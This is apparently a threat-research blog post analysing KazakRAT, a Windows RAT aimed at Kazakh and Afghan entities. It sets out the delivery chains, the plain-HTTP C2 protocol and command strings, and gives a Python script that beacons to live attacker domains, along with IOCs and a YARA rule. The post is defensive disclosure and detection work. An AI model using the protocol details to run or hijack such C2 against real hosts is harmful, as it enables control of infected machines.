---
title: "Attack on *stan: Your malware, my C2"
classes: wide
header:
  teaser: /assets/images/afguzb/logo.png
ribbon: black
description: "Suspected state-affiliated actor targets Afghan and Kazakh entities"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# KazakRAT

While hunting for C2 infrastructure on Censys, we uncovered a suspected state-affiliated cluster targeting Kazakh and Afghan entities in a persistent campaign, with C2 servers active at the time of writing (20th Jan 2026) that have been operating unreported since at least August 2022. 

During our tracking we identified a Windows-based RAT, delivered as a DLL, that we have coined KazakRAT. KazakRAT allows the threat actor to download and run additional payloads, enumerate and collect host data, and search for and exfiltrate files. The malware has simple installation process, often containing decoys relevant to victims. The KazakRAT binaries themselves were not obfuscated making it simple to analyse. C2 communications are unencrypted and follow a simple beaconing mechanism over HTTP. Based on overlapping C2 infrastructure, we observed this same group also using modified version of XploitSpy, Android Spyware, for espionage activities targeting Uzbek and Syrian extremist groups.  

Due to an operational mistake by the adversary, we now own one of their KazakRAT C2 domains, allowing us to redirect victim traffic to a sinkhole to passively collect victim IP addresses beaconing home.  Given how straightforward the implant and protocol are, it was possible to re-implement the server-side C2 in Python, allowing us to finish this blue-team blog with a calc.exe POC :P 

[![1](/assets/images/afguzb/2.png)](/assets/images/afguzb/2.png){: .align-center}

# Malware Delivery & Persistence

The samples identified had all been delivered via `.msi` files, with different variants of the RAT being delivered using slightly different mechanisms. Regardless of the delivery method, all observed samples persist using the Run registry key in order to execute the DLL with `rundll32`.

[![1](/assets/images/afguzb/B23.png)](/assets/images/afguzb/B23.png){: .align-center}

## .msi -> .exe -> rundll32 Run key (Variant A)

Found on VirusTotal, the file [5573fa.msi](https://www.virustotal.com/gui/file/312c9c3241409ec4ce4a75fb0e207aeb7de8004d0096b24bc727aa723eb47c54) contains the files [SysDrive.exe](https://www.virustotal.com/gui/file/c164dcb81a6590b70ee6c0ab6a62da6e7a7c803bdc13a060beb84b33bd42c223) and [SysDriveLib.dll](https://www.virustotal.com/gui/file/0aa58a9fe4d78a20e7b4c77fc1df759953fbc2cff7403941aaa0e0fa136f9683). `SysDriveLib.dll` is the RAT. 

* `SysDrive.exe` (86d884956a0cab7f536b3b98edea0454)
* `SysDriveLib.dll` (9f660ee1b0e68a140a629b4e8842da06)

When the user double-clicks the MSI, the process `SysDrive.exe` will be ran. This binary is leveraged to copy the RAT DLL to `C:\Users\[user]\AppData\Roaming\SysDrive\SysDriveLib.dll` and establish persistence via the Run key `6`.

[![1](/assets/images/afguzb/B13.png)](/assets/images/afguzb/B13.png){: .align-center}

## .zip -> .msi -> .exe -> rundll32 Run key + Kazakh decoy (Variant C)

Found on VirusTotal, the file [Docuemnt_Word.zip](https://www.virustotal.com/gui/file/4551133e1cb63a7a2470c677d060ab255deb5c7242113079ea210e7f5a4880d0) contains the .msi file [Document_Online_PDF_converter_XLSX.msi](https://www.virustotal.com/gui/file/4e6f2ed696460c98b9148cb66ef8249bccd8b809b13b02100fcb444f1d13b228).

* `Word.exe` (7aa12bf3606e1a74597be4237ce4a6e5)
* `NT.dll` (e36f27a13054f05da69761dc830b0db3)
* `flReport.doc` (70e6e936c54f968d92ee38806661a539)

Like the above, the executable inside the msi is used to establish persistence via the creation of the Run key `8`. Notably this sample had a decoy Word document, `flReport.doc`, that is a fake letter from the President of the Republic of Kazakhstan. 

[![1](/assets/images/afguzb/B22.png)](/assets/images/afguzb/B22.png){: .align-center}

For those interested, below is the letter translated:

```
Dear compatriots!

I congratulate you on the Constitution Day of the Republic of Kazakhstan!

The country’s Fundamental Law has convincingly stood the test of time and proven its foundational importance in defining the nationwide direction of our historical development.

Having laid a reliable foundation for our statehood, the Constitution has made a significant contribution to ensuring domestic political stability and consolidating Kazakhstani society.

The principles of the rule of law, strict observance of rights and freedoms, social guarantees, and the highest universal human values proclaimed by our Constitution are close to and understood by every citizen.

At the present stage, constitutional norms of social and state structure are the basis for steady development and modernization processes, ensuring a confident future for all the people of Kazakhstan!

On this day, I wish all Kazakhstanis peace, constructive initiatives, and well-being!
```

## .msi -> rundll32 Run key + Afghani decoy (Variant B)

Found on VirusTotal, the file [Instruction.msi](https://www.virustotal.com/gui/file/a7287c732c0559d49b9ad22f4fa843d3a837b33122e9195650e7f5331c27cf29/) contains the files [MY.DLL](https://www.virustotal.com/gui/file/5e60ccf20044148cbb58c063c245979a19db6be1cfed6a3a018c7430a0c75e44) and [MY.DOC](https://www.virustotal.com/gui/file/d9e99210f813b0b265c3a5aa236128fe5cab5eb56da9a9551cd3f849d7b9405d).

* `MY.DLL` (87343a65550b4f7a336b892cc9188e82) 
* `MY.DOC` (9b852f9a0fb735ca809f6895afc54dca)

Upon installation, the `MY.DLL` payload will be copied to `C:\ProgramData\NT\NT.dll` and the corresponding Run key `9` will be used to execute the DLL with `rundll32`:

[![1](/assets/images/afguzb/B14.png)](/assets/images/afguzb/B14.png){: .align-center}

The file `MY.DOC` is actually a PDF that contains a set of scanned official letter/memo from Afghanistan's (Islamic Emirate) Provincial authorities in Khost, about a public works / construction project for mosques:

[![1](/assets/images/afguzb/B15.PNG)](/assets/images/afguzb/B15.PNG){: .align-center}

## .msi -> rundll32 Run key + Kazakh decoy (Variant B)

Found on VirusTotal, the we discovered another .MSI file, [Microsoft Word Document.msi](https://www.virustotal.com/gui/file/df7b92b717abe121fb536a0eeb8e323cc9153f70250656dfc670c9650776afa7) (also named `dfgdfg.exe` on VT) that followed a similar execution pattern to the above Afghani decoy. This also .msi also contains the files `MY.DLL` & `MY.DOC` that are RAT and corresponding decoy. 

* `MY.DLL` (3e9a8d405f75d0ed8fc674bfaad1f87f) 
* `MY.DOC` (a3299674576e4210a0e78fb37a27c34f)

Like the above, the `MY.DLL` payload will be copied to `C:\ProgramData\NT\NT.dll` and the corresponding Run key `9` will be used to execute the DLL with `rundll32`.

In this case, the `MY.DOC` is an actual Word Document. This is an analytical briefing/note about foreign economic activity (external trade) in the Karaganda Region in Kazakhstan:

[![1](/assets/images/afguzb/B21.PNG)](/assets/images/afguzb/B21.PNG){: .align-center}

This document was downloaded from the domain `hXXps://keu.edu[.]kz/images/stories/NBRK/article_1109081029.doc`. 

---

# Command & Control

KazakRAT uses the Win32 API function `SetTimer` with `TimerFunc` used as the procedure in order to beacon every 5 seconds for new commands. 

[![1](/assets/images/afguzb/B1.png)](/assets/images/afguzb/B1.png){: .align-center}

The `TimerFunc` retrieves C2 commands via sending a POST request in the following format:

```
POST /as/include.php HTTP/1.1
Host:[HOST]
Content-Type:application/x-www-form-urlencoded
Content-Length:[LENGTH]
Connection: close


id=[DEVICE_ID]
```

The default response the KazakRAT C2 server will make is just `()`. If commands have been sent, they will be contained within the brackets like `(info)` or `(exec c:\programdata\svchost.exe)` 

The RAT sends responses to commands as `POST` requests with an additional parameter, `msg`, gives a brief response message.  
```
POST /as/include.php HTTP/1.1
Host:[C2_HOST]
Content-Type:application/x-www-form-urlencoded
Content-Length:[LENGTH]
Connection: close

id=[DEVICE_ID]&msg=ok
```

[![1](/assets/images/afguzb/B2.png)](/assets/images/afguzb/B2.png){: .align-center}

> The device ID is constructed from the [VolumeSerialNumber](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-logicaldisk) of the `C:/` drive. Specifically, the hex string of the first and last 16-bits of the serial number, joined with a dash `-`. For example, `a1b2-c3d4`.

We discovered a variant **A** sample by pivoting on the domain `fsocmicrsoft[.]com` in VirusTotal and found the DLL, `SysDriveLib.dll` (9f660ee1b0e68a140a629b4e8842da06) that communicated with `server.fsocmicrsoft[.]com` (currently pointing to `181.174.164[.]193`). This was uploaded to VirusTotal on `2023-09-03 08:19:31 UTC` and has a compilation timestamp of `2023-05-11 13:02:49 UTC`.

The C2 server for variant **A**, on `181.174.164[.]193`, currently has another domain pointing to this same IP address, `dns.microbwt[.]team` that we can see on Censys: 

[![1](/assets/images/afguzb/B6.png)](/assets/images/afguzb/B6.png){: .align-center}

Pivoting on this new domain we can find another sample, `NT.dll` (87343a65550b4f7a336b892cc9188e82), which was variant **B**. This was uploaded to VirusTotal on `2025-01-01 15:53:08 UTC` and has a compilation timestamp of `2024-11-28 10:30:00 UTC`. We can pivot further to identify the below samples related to this operation. 

| Compilation Time (UTC) | VirusTotal upload (UTC) | MD5 | C2 domain | C2 IP address (then) | HTTP Host header | Variant |
|----|----|----|----|----|----|----|
| 2023-03-15 10:00:22 | 2023-03-27 09:56:45 | 687442da7be02a2a72c36a9a1dbe9b97 | dns.freiesasien[.]com | 193.57.138[.]41 | dns.freiesasien[.]com | **D** |
| 2023-05-11 13:02:49 | 2023-09-03 08:19:31 | 9f660ee1b0e68a140a629b4e8842da06 | server.fsocmicrsoft[.]com | 190.14.37[.]114 | server.fsocmicrsoft[.]com | **A** |
| 2023-08-01 09:53:54 | 2023-09-06 11:16:55 | db942ba4cf38912a07eacc9e01d56574 | dns.freiesasien[.]com | 190.14.37[.]113 | dns.freiesasien[.]com | **C** |
| 2023-10-09 13:33:29 | 2023-10-26 10:06:02 | e36f27a13054f05da69761dc830b0db3 | dns.freiesasien[.]com | 190.14.37[.]113 | dns.freiesasien[.]com | **C** |
| 2024-05-06 11:47:54 | 2024-06-27 04:56:01 | 3e9a8d405f75d0ed8fc674bfaad1f87f | dns.freiesasien[.]com | 181.174.164[.]55 | dns.freiesasien[.]com | **B** |
| 2024-11-28 10:30:00 | 2025-01-01 15:53:08 | 87343a65550b4f7a336b892cc9188e82 | dsn.mamurigovaf[.]site | 181.174.164[.]111 | dns.microbwt[.]team | **B** |
| 2025-07-10 12:00:51 | 2025-07-25 17:30:39 | 76a7822a243f338bf3c5bc5c53997c12 | dsn.mamurigovaf[.]site  | 181.174.164[.]111 | dsn.mamurigovaf[.]site |**B** |

We can create a correlation graph to highlight overlaps in infrastructure across campaigns targeting disparate entities. Notably, across all samples observed, we only observed C2 servers for KazakRAT located on IP addresses on AS209847 and AS52469.

[![1](/assets/images/afguzb/2.png)](/assets/images/afguzb/2.png){: .align-center}

From the above you can see 3 similar execution chains, 2 of which share the same decoy and same KazakRAT variant, all with C2 domain name `dns.freiesasien[.]com`. From past sandbox reports and historical DNS records we can see 2 IP addresses on AS52469 and one on AS209847.

[![1](/assets/images/afguzb/3.png)](/assets/images/afguzb/3.png){: .align-center}

The above correlation graphs shows the overlapping ASNs leveraged for KazakRAT samples that were observed across both campaigns. Notice that one KazakRAT sample (87343a65550b4f7a336b892cc9188e82) has a mismatch in the HTTP host header and C2 domain name observed. It will make network connect to the domain `dsn.mamurigovaf[.]site`, although it leverages the HTTP Host header `dns.microbwt[.]team`  - which is likely another KazakRAT C2. We couldn't find samples on VirusTotal that were correctly configured to this C2 server, however, it currently points to the same IP address as the domain `server.fsocmicrsoft[.]com`. 


## Commands


| Command string (as sent by C2) | Variant A | Variant B | Variant C | Variant D | What it does                                                                                                    |
| ------------------------------ | --------: | --------: | --------: | --------: | ---------------------------------------------------------------------------------------------------------------------------- |
| `exec`                         |         ✅ |         ✅ |         ✅ |         ✅ | Run an executable on disk with `CreateProcessW`   |
| `disks`                        |         ✅ |         ✅ |         ✅ |         ✅ | Enumerate logical drives (C:, D:, etc) |
| `info`                         |         ✅ |         ✅ |         ✅ |         ✅ | Host profiling. **A/C/D** also enumerate running processes; **B** enumerates OS version only (no `EnumProcesses`). |
| `ctd`                          |         ✅ |         ✅ |         ✅ |         ✅ | Creates hidden directory |
| `upload`                       |         ✅ |         ✅ |         ✅ |         ✅ | Downloads file to disk using HTTP |
| `dir`                          |         ✅ |         ❌ |         ✅ |         ✅ | Directory/file listing with wildcards |
| `aaa`                          |         ❌ |         ✅ |         ❌ |         ❌ | Directory/file listing with wildcards |
| `dload`                        |         ✅ |         ❌ |         ❌ |         ❌ | Exfiltrates file from victim host to TA over HTTP POST |
| `download`                     |         ❌ |         ❌ |         ✅ |         ❌ | Exfiltrates file from victim host to TA over HTTP POST |
| `dl`                           |         ❌ |         ❌ |         ❌ |         ✅ | Exfiltrates file from victim host to TA over HTTP POST|


### Command Execution

In all KazakRAT variants, if the command sent from C2 is `exec`, the RAT will run the executable passed as the parameter using `CreateProcessW`:

[![1](/assets/images/afguzb/B3.png)](/assets/images/afguzb/B3.png){: .align-center}

This function will return a boolean value representing whether execution was successful or not. If successful, the RAT will respond with the message `ok`, otherwise it will return `error`.

[![1](/assets/images/afguzb/B4.png)](/assets/images/afguzb/B4.png){: .align-center}

### Disks

In all KazakRAT variants, if the command sent to C2 is `disks`, the RAT will use the function `GetLocalDrives()` to return a listing of the single character drives that exist on the system.  

### System Information

If the command received from the C2 contains the string `info`, all variants of  KazakRAT will collect OS version information using `GetVersionExW`.

[![1](/assets/images/afguzb/B7.png)](/assets/images/afguzb/B7.png){: .align-center}

Notably, in variants **A**, **C**, **D** sample also leveraged the Win32 API function `EnumProcesses` enumerate PIDs which are then used to get process names. These are separated with HTML break's `<br>`.  

[![1](/assets/images/afguzb/B8.png)](/assets/images/afguzb/B8.png){: .align-center}

### File System

In all KazakRAT variants, the command `ctd` allowed the operator to create a hidden directory using `CreateDirectoryA` and `SetFileAttributesW`, with the parameter `2` (`FILE_ATTRIBUTE_HIDDEN`):

[![1](/assets/images/afguzb/B12.png)](/assets/images/afguzb/B12.png){: .align-center}

In variant **B**, the command `aaa` allowed listing directories and searching for files using glob pattern using the functions `FindFirstFileA ` and `FindNextFileA`. The filenames are returned as separated with `<br>` tags.

[![1](/assets/images/afguzb/B9.png)](/assets/images/afguzb/B9.png){: .align-center}

In variants **A**, **C**, **D**, the command `dir` also leveraged the above two Win32 API functions to list directories and search for files, also seperating with `<br>` tags, but also had the capability to mark directories in the response. Variant **A**, **C** & **D** can differentiate between file or directory when listing results, although variant **B** cannot.  

### Upload / Download

In all KazakRAT variants, the `upload` command can be used to download a file from a remote URL to the victim host. It takes two arguments, a URL and output path. 

In variant **A** only, the command `dload` allows the operator to exfiltrate (or download) local files over HTTP POST request. In variants **C** & **D** this "download" functionality is implemented by the commands `download` and `dl` respectively. Variant **B** has no corresponding "download" functionality.

[![1](/assets/images/afguzb/B11.png)](/assets/images/afguzb/B11.png){: .align-center}

# Emulating client-side RAT

Taking lessons learnt from Ms McGonagall's Transfiguration classes, we can turn a Python into a RAT. Using a simple Python script we can try emulate the beaconing procedure and see if we get any responses from C2: 

```python
import requests
import time 


beacon1 = "server.fsocmicrsoft.com"
beacon2 = "dsn.mamurigovaf.site"


def C2_req(host):

    url=f"http://{host}/as/include.php"

    headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Host":f"{host}"
    }

    if host == "server.fsocmicrsoft.com":
        data = "1f23-7db4"                # randomly chosen device IDs
    elif host == "dsn.mamurigovaf.site":
        data = "75be-9ef2"


    r = requests.post(url, headers=headers, data=f"id={data}", timeout=10)
    print(f"{host} Status:", r.status_code)
    print(f"{host} Body:", r.text)

while True:
    C2_req(beacon1)
    C2_req(beacon2)
    time.sleep(5)
```

# Resurrecting the KazakRAT C2 

In this campaign, we observed the domain `dns.freiesasien[.]com` was used for C2 over HTTP (not encrypted). On December 28th we bought this domain and created an `A` record to point `dns.freisassien[.]com` to a server we own.

As a reminder, this malware beacons to `/as/include.php` on port 80. We setup a simple Python HTTP server and log requests that were made to `/as/include.php` overnight:

[![1](/assets/images/afguzb/B16.png)](/assets/images/afguzb/B16.png){: .align-center}

We can see multiple Kazakh IP addresses beaconing, still infected with the RAT. This victimology is expected given the Kazakh lures and files uploaded to VirusTotal from Kazakh IP addresses. To make life easier we vibecoded a dashboard for tracking device IDs that are beaconing in:

[![1](/assets/images/afguzb/B20.png)](/assets/images/afguzb/B20.png){: .align-center}

The devices with < 100 beacons typically are just malware sandboxes with internet access running the sample. 

# Reimplementing server-side components  

When victims beacon to `/as/include.php` for commands, the HTTP response will contain the command to be executed within brackets, like `(info)`.

## Self infection

We can run the malware found on VirusTotal, originally uploaded by Kazakh IP addresses, on our VM and see the corresponding victim ID beacon in. 

[![1](/assets/images/afguzb/B18.png)](/assets/images/afguzb/B18.png){: .align-center}

Using a simple Python script, we run C2 commands on our infected "victim" VM:

[![1](/assets/images/afguzb/B19.png)](/assets/images/afguzb/B19.png){: .align-center}

<center>
<video width="1080" height="720" controls="controls">
<source src="/assets/images/afguzb/hm.mp4" type="video/mp4">
</video>
</center>

# Attribution

We were unable to attribute this activity with high confidence to any known threat group. However, based on victim targeting, lure themes, and the long-term persistence, we assess this malware campaign is likely linked to a suspected state-affiliated actor operating across Kazakh and Afghan-themed victim sets. The actor leverages both modified open-source Android spyware (including XploitSpy) and a lightweight Windows DLL RAT, which we refer to as KazakRAT. The Windows implant is unobfuscated and communicates over unencrypted HTTP, suggesting limited emphasis on evasion. The operator’s lapse in allowing C2 domains to expire supports an assessment of low operational maturity.

This activity has been ongoing since at least August 2022, when the earliest related Android samples were uploaded to VirusTotal, with associated C2 infrastructure still active at the time of writing. Over the course of the campaign, we observed multiple KazakRAT variants with minor command-set changes and repeated use of Kazakh-themed lures, indicating targeting of Kazakhstan. Based on lure content and sinkhole telemetry, we assess likely targeting includes government and financial sector roles, particularly in the Karaganda region. We also identified two KazakRAT samples delivered with Afghan-themed decoys, suggesting secondary targeting of Afghan government-related entities.

In August 2022, Meta published their [Quarterly Adversarial Threat Report](https://about.fb.com/wp-content/uploads/2022/08/Quarterly-Adversarial-Threat-Report-Q2-2022.pdf) in which it described actions taken against APT36, a Pakistan-based threat group also known as Transparent Tribe, reportedly targeting entities in Afghanistan, India, Pakistan, and Saudi Arabia. Meta noted that the group’s activity, while relatively low in sophistication, was persistent and targeted. We observed similar long-term, persistent targeting, including incremental changes across KazatRAT variants over time. These compilation dates indicate the campaign has likely been ongoing for more than three years. Meta also reported that APT36 used modified versions of XploitSpy, reinforcing a broader trend in which less sophisticated actors can successfully rely on open-source tooling rather than investing heavily in bespoke development.

While we identified no definitive links between the threat group observed in this research and APT36 / Transparent Tribe, we highlight the overlap in tooling choices, limited sophistication, and aspects of victimology.

# IOCs

## Network
 
| Type   | Indicator                                                             | Context / Notes                                                                            |
| ------ | --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| Domain | `server.fsocmicrsoft[.]com`                                           | Windows RAT C2 over HTTP                                                                   |
| Domain | `dns.freiesasien[.]com`                                               | Windows RAT C2 domain (HTTP)                                                               |
| Domain | `dsn.mamurigovaf[.]site`                                              | Windows RAT C2 domain (HTTP)                                                               |
| Domain | `dns.microbwt[.]team`                                                 | Related C2 domain                                                                          |
| IP     | `181.174.164[.]193`                                                   | Active C2 IP (03/01/25) for `server.fsocmicrsoft[.]com`                                    |
| IP     | `190.14.37[.]114`                                                     | Historical C2 IP (then) for `server.fsocmicrsoft[.]com`                                    |
| IP     | `193.57.138[.]41`                                                     | Historical C2 IP (then) for `dns.freiesasien[.]com`                                        |
| IP     | `190.14.37[.]113`                                                     | Historical C2 IP (then) for `dns.freiesasien[.]com`                                        |
| IP     | `181.174.164[.]55`                                                    | Historical C2 IP (then) for `dns.freiesasien[.]com`                                        |
| IP     | `181.174.164[.]111`                                                   | Active C2 IP (03/01/25) for `dsn.mamurigovaf[.]site`                                       |
| URL    | `hXXp://<C2>/as/include.php`                                          | Beacon/command polling endpoint (HTTP POST)                                                |

## File System

| File name                                              | Role                           |                  SHA256 | 
| ------------------------------------------------------ | ------------------------------ | ---------------------------------: |
| `5573fa.msi`                                           | Installer                      | `312c9c3241409ec4ce4a75fb0e207aeb7de8004d0096b24bc727aa723eb47c54` |
| `Document_Online_PDF_converter_XLSX.msi`               | Installer                      | `4e6f2ed696460c98b9148cb66ef8249bccd8b809b13b02100fcb444f1d13b228` |
| `Instruction.msi`                                      | Installer                      | `a7287c732c0559d49b9ad22f4fa843d3a837b33122e9195650e7f5331c27cf29` |
| `Microsoft Word Document.msi`                          | Installer                      | `df7b92b717abe121fb536a0eeb8e323cc9153f70250656dfc670c9650776afa7` |
| `SysDrive.exe`                                         | Dropper/loader                 | `c164dcb81a6590b70ee6c0ab6a62da6e7a7c803bdc13a060beb84b33bd42c223` |
| `Word.exe`                                             | Dropper/loader                 | `c19b7adff6876fb527cc05f10137b8ada81ea8afc3dee760b5aa2016350bb3af` |
| `Docuemnt_Word.zip`                                    | Container                      | `4551133e1cb63a7a2470c677d060ab255deb5c7242113079ea210e7f5a4880d0` |
| `flReport.doc`                                         | Decoy document (Kazakh themed) | `0dd99aa29a8dc919fba9060efa771e6b825a7681f46a5bdc01b319348c19b69c` |
| `MY.DOC`                                               | Decoy document (Afghan themed)| `d9e99210f813b0b265c3a5aa236128fe5cab5eb56da9a9551cd3f849d7b9405d` |
| `MY.DOC`                                               | Decoy document (Kazakh themed) | `291f364c0abece2454e9674f0b1f6721ed2a66d58420eb48f896883c6eb0717a` |
| `SysDriveLib.dll`                                      | RAT DLL (**A**)                        | `0aa58a9fe4d78a20e7b4c77fc1df759953fbc2cff7403941aaa0e0fa136f9683` |
| `NT.dll`                                               | RAT DLL (**C**)                         | `0669ad73c27e8c7eecf28db3a04ef1fd1738c2d11f1765c0e68444abd3ce7246` |
| `NT.dll`                                               | RAT DLL (**B**)                        | `5e60ccf20044148cbb58c063c245979a19db6be1cfed6a3a018c7430a0c75e44` |
| `NT.dll`                                               | RAT DLL (**B**)        | `3a7685e59bb3e2a4d7e8f2e1b8cadcb030829b94d0a79ed1cefe648b7efb3d5a` |
| `NT.dll`                                               | RAT DLL (**D**)                 | `b269225f6ff9e3b18ddd22df508b4daf26556b013b1527a809dc87eaca108ea9` |
| `NT.dll`                                               | RAT DLL (**C**)                         | `683e8fedff2360d8fd4a5e0dfd4a5bc8b6d84fc7bcbff6bd86d1add19ce74133` |
| `NT.dll`                                               | RAT DLL (**B**)                        | `445eca3da9e518139ab6aa89bbd42998deb897f85e7c713bc997fe4d14d46492` |


## Yara

```yara
rule KazakRAT
{
    meta:
        author = "CtrlAltIntel"
        description = "Identifying known variants of KazakRAT samples"
        date = "03/01/2025"

    strings:
        $uni1 = "exec" ascii wide fullword
        $uni2 = "info" ascii wide fullword
        $uni3 = "disks" ascii wide fullword
        $uni4 = "upload" ascii wide fullword         // All Variants
        $uni5 = "FolderCreated" ascii wide fullword
        $uni6 = "NotCreated" ascii wide fullword
        $uni7 = "x-www-form-urlencoded" ascii wide 

        $dir1 = "dir" ascii wide fullword  // Variant A,C,D
        $dir2 = "aaa" ascii wide fullword // Variant B

    condition:
        uint16(0) == 0x5A4D
        and filesize < 100KB
        and (
            all of ($uni*)
            and any of ($dir*)  
        )
}
```
